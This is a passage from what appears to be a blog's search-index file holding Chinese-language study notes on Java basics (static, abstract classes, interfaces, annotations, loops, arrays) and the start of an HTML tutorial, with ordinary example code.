class="line"><span class="comment">toString(): 返回表示 Integer 值的 String 对象。</span></span><br><span class="line"><span class="comment">toString(int i): 返回表示指定 int 的 String 对象。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(x.toString());  </span><br><span class="line">        System.out.println(Integer.toString(<span class="number">12</span>)); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*编译以上程序，输出结果为：</span></span><br><span class="line"><span class="comment">5</span></span><br><span class="line"><span class="comment">12</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="static静态"><a href="#static静态" class="headerlink" title="static静态"></a>static静态</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//static修饰变量</span></span><br><span class="line"><span class="comment">//类中公用</span></span><br><span class="line"><span class="keyword">static</span> <span class="type">boolean</span> nfc;</span><br><span class="line">p1.nfc =<span class="literal">true</span>;</span><br><span class="line">System.out.println(p1.nfc);<span class="comment">//ture</span></span><br><span class="line">System.out.println(p2.nfc);<span class="comment">//true</span></span><br><span class="line">p2.nfc=<span class="literal">false</span>;</span><br><span class="line">System.out.println(p1.nfc);<span class="comment">//false</span></span><br><span class="line">System.out.println(p1.nfc);<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//static修饰方法</span></span><br><span class="line"><span class="comment">//static方法内可以调用static属性和static方法，不可以调用非static</span></span><br><span class="line"><span class="comment">//非static可以调用static</span></span><br></pre></td></tr></table></figure><h2 id="abstract抽象"><a href="#abstract抽象" class="headerlink" title="abstract抽象"></a>abstract抽象</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 抽象类不能被实例化(初学者很容易犯的错)，如果被实例化，就会报错，编译无法通过。只有抽象类的非抽象子类可以创建对象。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2. 抽象类中不一定包含抽象方法，但是有抽象方法的类必定是抽象类。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3. 抽象类中的抽象方法只是声明，不包含方法体，就是不给出方法的具体实现也就是方法的具体功能。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4. 构造方法，类方法（用 static 修饰的方法）不能声明为抽象方法。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5. 抽象类的子类必须给出抽象类中的抽象方法的具体实现，除非该子类也是抽象类。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//属性 必须使用public static final 修饰 不写默认加上</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Java 原则上只支持单一继承，但通过接口可以实现多重继承的目的。</span></span><br><span class="line"><span class="comment">//ClassC 同时继承了 ClassA 和 ClassB，ClassC 的对象在调用 ClassA 和 ClassB 中重写的方法时，就不知道该调用 ClassA 的方法，还是 ClassB 的方法。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//接口没有这方面的困扰。来定义两个接口，Fly 接口会飞，Run 接口会跑。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Fly</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">fly</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Run</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pig</span> <span class="keyword">implements</span> <span class="title class_">Fly</span>,Run&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fly</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;会飞的猪&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;会跑的猪&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现多态。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    String <span class="title function_">name</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">name</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;圆&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Square</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">name</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;正方形&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">List&lt;Shape&gt; shapes = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="type">Shape</span> <span class="variable">circleShape</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Circle</span>();</span><br><span class="line"><span class="type">Shape</span> <span class="variable">squareShape</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Square</span>();</span><br><span class="line"></span><br><span class="line">shapes.add(circleShape);</span><br><span class="line">shapes.add(squareShape);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Shape shape : shapes) &#123;</span><br><span class="line">    System.out.println(shape.name());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//圆</span></span><br><span class="line"><span class="comment">//正方形</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OuterClass</span> &#123;   <span class="comment">// 外部类</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">NestedClass</span> &#123; <span class="comment">// 嵌套类，或称为内部类</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>枚举类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">    RED, GREEN, BLUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@Override - 检查该方法是否是重写方法。如果发现其父类，或者是引用的接口中并没有该方法时，会报编译错误。</span><br><span class="line">@Deprecated - 标记过时方法。如果使用该方法，会报编译警告。</span><br><span class="line">@SuppressWarnings - 指示编译器去忽略注解中声明的警告。</span><br><span class="line">作用在其他注解的注解(或者说 元注解)是:</span><br><span class="line"></span><br><span class="line">@Retention - 标识这个注解怎么保存，是只在代码中，还是编入class文件中，或者是在运行时可以通过反射访问。</span><br><span class="line">@Documented - 标记这些注解是否包含在用户文档中。</span><br><span class="line">@Target - 标记这个注解应该是哪种 Java 成员。</span><br><span class="line">@Inherited - 标记这个注解是继承于哪个注解类(默认 注解并没有继承于任何子类)</span><br><span class="line">从 Java 7 开始，额外添加了 3 个注解:</span><br><span class="line"></span><br><span class="line">@SafeVarargs - Java 7 开始支持，忽略任何使用参数为泛型变量的方法或构造函数调用产生的警告。</span><br><span class="line">@FunctionalInterface - Java 8 开始支持，标识一个匿名函数或函数式接口。</span><br><span class="line">@Repeatable - Java 8 开始支持，标识某注解可以在同一个声明上使用多次。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基本语法</title>
      <link href="/2023/12/23/java%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/12/23/java%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Java基本语法"><a href="#Java基本语法" class="headerlink" title="Java基本语法"></a>Java基本语法</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单行注释 //</span><br><span class="line">多行注释 /* */</span><br><span class="line">文档注释 /** */</span><br></pre></td></tr></table></figure><h2 id="变量与运算符"><a href="#变量与运算符" class="headerlink" title="变量与运算符"></a>变量与运算符</h2><h3 id="关键字的使用"><a href="#关键字的使用" class="headerlink" title="关键字的使用"></a>关键字的使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">关键字：被Java语言赋予了特殊含义，用做专门用途的字符串</span><br><span class="line">如 class public static void 等都是关键字</span><br><span class="line">关键字都是小写</span><br></pre></td></tr></table></figure><h3 id="标识符的使用"><a href="#标识符的使用" class="headerlink" title="标识符的使用"></a>标识符的使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Java中变量、方法、类等要素命名时使用的字符序列，被称为标识符</span><br><span class="line">凡是自己可以起名字的地方都叫标识符</span><br><span class="line">命名规则</span><br><span class="line">1.字母、数字、_、$组成</span><br><span class="line">2.数字不可以开头</span><br><span class="line">3.不可以使用关键字、保留字，但可以包含关键字、保留字</span><br><span class="line">4.Java中严格区分大小写，长度无限制</span><br><span class="line">5.不能包含空格</span><br><span class="line">命名规范</span><br><span class="line">1.包名 多单词时所有单词都小写 java.lang</span><br><span class="line">2.类名、接口名 多单词时所有单词首字母大写 HelloWorld</span><br><span class="line">3.变量名、方法名 多单词时第一个首字母小写，第二个开始首字母大写 bookName</span><br><span class="line">4.常量名 所有字母大写，多单词时用_连接 MAX_VALUE</span><br></pre></td></tr></table></figure><h3 id="变量的使用与数据类型"><a href="#变量的使用与数据类型" class="headerlink" title="变量的使用与数据类型"></a>变量的使用与数据类型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">概念：内存中的一个存储区域，该区域的数据可以在同一类型范围内不断变化</span><br><span class="line">要素：数据类型、变量名、存储的值</span><br><span class="line">格式：数据类型 变量名=变量值  int a=1;</span><br><span class="line">使用： 变量先声明后使用</span><br><span class="line">数据类型：</span><br><span class="line">整形 </span><br><span class="line">byte </span><br><span class="line">short </span><br><span class="line">int </span><br><span class="line">long 需要以1或者L作为后缀</span><br><span class="line">浮点型 </span><br><span class="line">float 单精度 需要以f或者F作为后缀</span><br><span class="line">double 双精度</span><br><span class="line">字符型 </span><br><span class="line">char 单字符</span><br><span class="line">    布尔型 </span><br><span class="line">    boolean</span><br><span class="line">    类 </span><br><span class="line">    class</span><br><span class="line">    数组 </span><br><span class="line">    array</span><br><span class="line">    接口 </span><br><span class="line">    interface</span><br><span class="line">    枚举 </span><br><span class="line">    enum</span><br><span class="line">    注解 </span><br><span class="line">    annotation</span><br><span class="line">    记录 </span><br><span class="line">    record</span><br><span class="line">强制类型转换</span><br><span class="line">float b=(float)a;</span><br></pre></td></tr></table></figure><h2 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符串 String</span><br><span class="line">String str=&#x27;hello&#x27;;</span><br></pre></td></tr></table></figure><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">算术运算符 + - * / % ++ --</span><br><span class="line">赋值运算符 = += -= *= /= %= &gt;&gt;= &lt;&lt;= &gt;&gt;&gt;= &amp;= |= ^=等</span><br><span class="line">比较运算符 &gt; &lt; &gt;= &lt;= == !=</span><br><span class="line">逻辑运算符 || &amp;&amp; | &amp; ^ ! </span><br><span class="line">位运算符 &amp; | ^ ~ &lt;&lt; &gt;&gt; &gt;&gt;&gt;</span><br><span class="line">条件运算符 条件？ 结果1:结果2</span><br></pre></td></tr></table></figure><h2 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式 <span class="number">1</span>)&#123;</span><br><span class="line">   <span class="comment">//如果布尔表达式 1的值为true执行代码</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(布尔表达式 <span class="number">2</span>)&#123;</span><br><span class="line">   <span class="comment">//如果布尔表达式 2的值为true执行代码</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(布尔表达式 <span class="number">3</span>)&#123;</span><br><span class="line">   <span class="comment">//如果布尔表达式 3的值为true执行代码</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="comment">//如果以上布尔表达式都不为true执行代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Scanner类"><a href="#Scanner类" class="headerlink" title="Scanner类"></a>Scanner类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//Scanner 类可以来获取用户的输入 </span></span><br><span class="line"> <span class="type">Scanner</span> <span class="variable">scan</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> scan.next();<span class="comment">//空格结束</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> scan.nextLine();<span class="comment">//回车结束</span></span><br></pre></td></tr></table></figure><h2 id="switch-case"><a href="#switch-case" class="headerlink" title="switch-case"></a>switch-case</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(expression)&#123;</span><br><span class="line">    <span class="keyword">case</span> value :</span><br><span class="line">       <span class="comment">//语句</span></span><br><span class="line">       <span class="keyword">break</span>; <span class="comment">//可选</span></span><br><span class="line">    <span class="keyword">case</span> value :</span><br><span class="line">       <span class="comment">//语句</span></span><br><span class="line">       <span class="keyword">break</span>; <span class="comment">//可选</span></span><br><span class="line">    <span class="comment">//你可以有任意数量的case语句</span></span><br><span class="line">    <span class="keyword">default</span> : <span class="comment">//可选</span></span><br><span class="line">       <span class="comment">//语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(初始化; 布尔表达式; 更新) &#123;</span><br><span class="line">    <span class="comment">//代码语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>( 布尔表达式 ) &#123;</span><br><span class="line">  <span class="comment">//循环内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do-while循环"></a>do-while循环</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对于 while 语句而言，如果不满足条件，则不能进入循环。但有时候我们需要即使不满足条件，也至少执行一次。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>…<span class="keyword">while</span> 循环和 <span class="keyword">while</span> 循环相似，不同的是，<span class="keyword">do</span>…<span class="keyword">while</span> 循环至少会执行一次。</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">       <span class="comment">//代码语句</span></span><br><span class="line">&#125;<span class="keyword">while</span>(布尔表达式);</span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明数组</span></span><br><span class="line">      <span class="type">int</span> arr[];</span><br><span class="line">      <span class="comment">//初始化</span></span><br><span class="line">      arr=<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">7</span>&#125;;</span><br><span class="line">      <span class="comment">//调用</span></span><br><span class="line">      System.out.println(arr[<span class="number">6</span>]);</span><br><span class="line">      <span class="comment">//数组长度</span></span><br><span class="line">      System.out.println(arr.length);</span><br><span class="line">      <span class="comment">//For-Each 循环 也可以用其他循环</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> element: arr)</span><br><span class="line">      &#123;</span><br><span class="line">          System.out.println(element);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明数组</span></span><br><span class="line">      <span class="type">int</span> arr[][];</span><br><span class="line">      <span class="comment">//初始化</span></span><br><span class="line">      arr=<span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;&#123;<span class="number">1</span>&#125;,&#123;<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">7</span>&#125;&#125;;</span><br><span class="line">      <span class="comment">//调用</span></span><br><span class="line">      System.out.println(arr[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">      <span class="comment">//数组长度</span></span><br><span class="line">      System.out.println(arr.length);</span><br><span class="line">      <span class="comment">//For-Each 循环 也可以用其他循环</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span>[] element: arr)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">for</span>(<span class="type">int</span> cow:element)</span><br><span class="line">          &#123;</span><br><span class="line">              System.out.println(cow);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端3剑客</title>
      <link href="/2023/12/21/%E5%89%8D%E7%AB%AF3%E5%89%91%E5%AE%A2/"/>
      <url>/2023/12/21/%E5%89%8D%E7%AB%AF3%E5%89%91%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="前端3剑客"><a href="#前端3剑客" class="headerlink" title="前端3剑客"></a>前端3剑客</h1><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a><strong>标题</strong></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题h1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题h2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- h1到h6 --&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%89%8D%E7%AB%AF3%E5%89%91%E5%AE%A2.assets/html1.png"></p><h3 id="段落"><a href="#段落" class="headerlink" title="段落"></a><strong>段落</strong></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">       亚洲政策研究所 （API） 成立于 2023 年 5 月，是一家位于新泽西州的独立 501（c）（3） 非营利性研究机构。</span><br><span class="line">       我们专注于对亚洲面临的问题进行政策研究，应对亚洲各地的关键挑战，为政治家和企业提供政策见解</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   我们的核心竞争力在于提供高影响力、高成本效益的社会研究，为政治家和企业提供建议，</span><br><span class="line">   为亚洲的政策制定提供适当的方向，以创造亚洲更美好的未来</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%89%8D%E7%AB%AF3%E5%89%91%E5%AE%A2.assets/html2.png"></p><h3 id="换行"><a href="#换行" class="headerlink" title="换行"></a><strong>换行</strong></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        亚洲政策研究所 （API） 成立于 2023 年 5 月，是一家位于新泽西州的独立 501（c）（3） 非营利性研究机构。<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        我们专注于对亚洲面临的问题进行政策研究，应对亚洲各地的关键挑战，为政治家和企业提供政策见解</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    我们的核心竞争力在于提供高影响力、高成本效益的社会研究，为政治家和企业提供建议，<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    为亚洲的政策制定提供适当的方向，以创造亚洲更美好的未来</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!-- br普通换行，hr换行加线 --&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%89%8D%E7%AB%AF3%E5%89%91%E5%AE%A2.assets/html3.png"></p><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!---</span></span><br><span class="line"><span class="comment">有序列表 ol</span></span><br><span class="line"><span class="comment">无序列表 ul</span></span><br><span class="line"><span class="comment">列表项 li</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>ol1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span 